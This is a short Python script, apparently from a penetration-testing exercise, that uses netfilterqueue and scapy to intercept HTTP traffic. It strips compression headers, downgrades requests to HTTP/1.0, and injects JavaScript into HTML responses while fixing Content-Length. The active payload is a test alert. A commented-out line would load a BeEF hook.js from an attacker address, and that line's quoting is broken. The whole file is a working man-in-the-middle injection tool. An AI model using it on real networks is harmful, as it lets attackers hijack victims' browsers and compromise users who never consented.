#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


standard = 'ISO-8859-1'
PORT = 80
ATTACKER_ADDR = "192.168.0.20"

# for simple local testing
injection_code = "<script>alert('test');</script>"
# for BeFF
# injection_code = '<script src="http://"' + ATTACKER_ADDR + '":3000/hook.js"></script>'

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode(standard)
            if scapy_packet.haslayer(scapy.TCP):
                if scapy_packet[scapy.TCP].dport == PORT:
                    print("[+] Request")
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
                    load = load.replace("HTTP/1.1", "HTTP/1.0")
        
                elif scapy_packet[scapy.TCP].sport == PORT:
                    print("[+] Response")
                    load = load.replace("</body", injection_code + "</body>")
                    content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                    if content_length_search and "text/html" in load:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(injection_code)
                        load = load.replace(content_length, str(new_content_length))
                        load = load.encode(standard)
            
            if load !=scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
print("[+] Starting...")
queue.run()




